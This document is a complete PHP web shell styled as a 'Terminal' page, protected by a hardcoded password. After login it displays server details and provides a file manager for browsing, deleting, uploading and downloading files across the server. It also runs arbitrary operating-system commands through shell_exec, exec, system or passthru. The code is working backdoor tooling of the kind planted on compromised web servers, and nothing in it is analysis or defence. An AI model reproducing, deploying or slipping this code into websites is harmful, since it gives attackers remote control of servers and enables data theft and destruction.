<?php
session_start();
header("Content-Type: text/html; charset=UTF-8");
$correct_password = "mypassword"; // Ganti dengan password yang diinginkan

if (isset($_POST['password']) && $_POST['password'] === $correct_password) {
    $_SESSION['authenticated'] = true;
}

$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

$current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!is_dir($current_path)) {
    $current_path = getcwd();
}
chdir($current_path);

function execute_command($cmd) {
    $output = "";
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output_arr);
        $output = implode("\n", $output_arr);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    } else {
        $output = "Command execution not supported on this server.";
    }
    return $output;
}

function list_files($dir) {
    $files = scandir($dir);
    $output = "<table><tr><th>Name</th><th>Size</th><th>Actions</th></tr>";
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $filepath = realpath($dir . DIRECTORY_SEPARATOR . $file);
        $size = is_file($filepath) ? filesize($filepath) . ' bytes' : '-';
        $output .= "<tr>
            <td><a href='?path={$filepath}'>{$file}</a></td>
            <td>{$size}</td>
            <td>
                <a href='?path={$dir}&delete={$file}'>Delete</a> |
                <a href='?path={$dir}&edit={$file}'>Edit</a> |
                <a href='?path={$dir}&rename={$file}'>Rename</a> |
                <a href='download.php?file={$filepath}'>Download</a>
            </td>
        </tr>";
    }
    $output .= "</table>";
    return $output;
}

if ($authenticated && isset($_GET['delete'])) {
    unlink($_GET['delete']);
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if ($authenticated && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $current_path . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
    header("Location: ?path=" . urlencode($current_path));
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: monospace;
            padding: 20px;
            position: relative;
        }
        .output, .command-input, .password-input, .file-upload {
            background-color: #222;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid lime;
            margin-top: 10px;
        }
        input, select {
            background: black;
            color: lime;
            border: none;
            font-family: monospace;
            width: 100%;
            outline: none;
            padding: 5px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            border: 1px solid lime;
            padding: 8px;
            text-align: left;
        }
        .logo {
            position: absolute;
            top: 10px;
            right: 10px;
            color: lime;
            font-size: 14px;
            text-align: right;
            white-space: pre;
        }
        .image-logo {
            text-align: center;
            margin-top: 10px;
        }
        .logout {
            position: absolute;
            top: 10px;
            left: 10px;
        }
    </style>
</head>
<body>
    <div class="logo">SKYb856E'</div>
    <?php if ($authenticated): ?>
    <a href="?logout" class="logout">Logout</a>
    <?php endif; ?>
    <h2>Server Info</h2>
    <table>
        <tr><th>Property</th><th>Value</th></tr>
        <tr><td>Uname</td><td><?php echo php_uname(); ?></td></tr>
        <tr><td>PHP Version</td><td><?php echo phpversion(); ?></td></tr>
        <tr><td>Server Software</td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>
        <tr><td>Server IP</td><td><?php echo $_SERVER['SERVER_ADDR']; ?></td></tr>
        <tr><td>Client IP</td><td><?php echo $_SERVER['REMOTE_ADDR']; ?></td></tr>
    </table>
    
    <?php if (!$authenticated): ?>
    <div class="password-input">
        <form method="post">
            <label>Enter Password: </label>
            <input type="password" name="password" autofocus>
            <input type="submit" value="Submit">
        </form>
    </div>
    <div class="image-logo">
        <img src="logo.png" alt="Logo" width="150">
    </div>
    <?php else: ?>
    <h2>File Manager - Current Path: <?php echo htmlspecialchars($current_path); ?></h2>
    <?php echo list_files($current_path); ?>
    <div class="file-upload">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>
    </div>
    <div class="command-input">
        <form method="post">
            <label>$ </label>
            <input type="text" name="cmd" autofocus>
            <input type="submit" value="Run">
        </form>
    </div>
    <div class="output">
        <h3>Command Output</h3>
        <?php
        if (!empty($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            echo "<strong>Command:</strong> " . htmlspecialchars($cmd) . "<br>";
            echo "<pre>" . execute_command($cmd) . "</pre>";
        }
        ?>
    </div>
    <?php endif; ?>
</body>
</html>
